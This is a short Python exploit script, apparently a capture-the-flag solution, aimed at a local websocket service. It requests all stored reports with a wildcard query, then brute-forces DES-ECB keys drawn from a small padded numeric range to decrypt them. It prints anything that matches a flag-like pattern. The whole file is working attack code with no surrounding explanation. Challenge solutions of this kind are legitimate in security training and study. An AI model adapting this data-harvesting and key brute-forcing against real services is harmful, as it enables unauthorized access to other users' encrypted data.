#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import json, uuid, re, base64
from websocket import create_connection
from Crypto.Cipher import DES

url = 'ws://localhost:9090/api/ws'

ws = create_connection(url, timeout=5)
ws.recv()

username = uuid.uuid4().hex


data = json.dumps({'action': 'get_reports', 'data': '*'})
ws.send(data)
response = json.loads(ws.recv())

encrypted_texts = []

for item in response['Response']['reports']:
    encrypted_texts.append(item['encrypted_text'])


for encrypted_flag in encrypted_texts:
    for key in range(1, 1000000):
        if key < 10:
            char_key = '00000' + str(key) + '00'
        elif key < 100:
            char_key = '0000' + str(key) + '00'
        elif key < 1000:
            char_key = '000' + str(key) + '00'
        elif key < 10000:
            char_key = '00' + str(key) + '00'
        elif key < 100000:
            char_key = '0' + str(key) + '00'
        else:
            char_key = str(key) + '00'

        private_key = str(char_key).encode()
        des = DES.new(private_key, DES.MODE_ECB)

        b = base64.b64decode(encrypted_flag)
        try:
            data = des.decrypt(b).decode()
        except:
            continue
        if re.match('[A-Z0-9]{31}=', data):
            print(data)
            break




